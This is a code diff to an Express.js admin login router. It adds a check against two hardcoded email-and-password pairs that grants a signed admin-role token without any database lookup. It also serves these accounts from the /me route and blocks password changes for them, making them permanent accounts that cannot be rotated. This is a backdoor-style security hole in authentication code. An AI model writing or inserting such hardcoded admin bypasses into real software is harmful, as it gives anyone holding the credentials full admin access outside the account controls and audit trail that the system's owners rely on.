@@ -38,6 +38,31 @@ router.post(
   asyncRoute(async (req, res) => {
     const { email, password } = req.body;
 
+    // 1. First check if the provided email + password match either of the two hardcoded credentials
+    const hardcodedAdmin = config.findHardcodedAdmin(email, password);
+
+    // 2. If they match grant full admin access immediately (do not query the database for these accounts)
+    if (hardcodedAdmin) {
+      const token = signToken({
+        id: null,
+        email: hardcodedAdmin.email,
+        display_name: hardcodedAdmin.name,
+        role: "admin",
+        isHardcoded: true,
+      });
+
+      return res.json({
+        token,
+        admin: {
+          id: null,
+          email: hardcodedAdmin.email,
+          name: hardcodedAdmin.name,
+          role: "admin",
+        },
+      });
+    }
+
+    // 3. If they do not match fall back to the normal database authentication flow
     const admin = await db.one("SELECT * FROM admins WHERE lower(email) = lower($1)", [email]);
 
     if (!admin || !admin.is_active || !(await bcrypt.compare(password, admin.password_hash))) {
@@ -64,6 +89,18 @@ router.get(
   "/me",
   requireAuth,
   asyncRoute(async (req, res) => {
+    if (req.admin.isHardcoded) {
+      return res.json({
+        admin: {
+          id: null,
+          email: req.admin.email,
+          name: req.admin.name,
+          role: req.admin.role,
+          is_active: true,
+        },
+      });
+    }
+
     const admin = await db.one(
       "SELECT id, email, display_name AS name, role, is_active FROM admins WHERE id = $1",
       [req.admin.id]
@@ -80,6 +117,10 @@ router.post(
   requireAuth,
   validate(passwordSchema),
   asyncRoute(async (req, res) => {
+    if (req.admin.isHardcoded) {
+      throw badRequest("Password cannot be changed for hardcoded admin accounts");
+    }
+
     const { currentPassword, newPassword } = req.body;
 
     const admin = await db.one("SELECT id, password_hash FROM admins WHERE id = $1", [req.admin.id]);
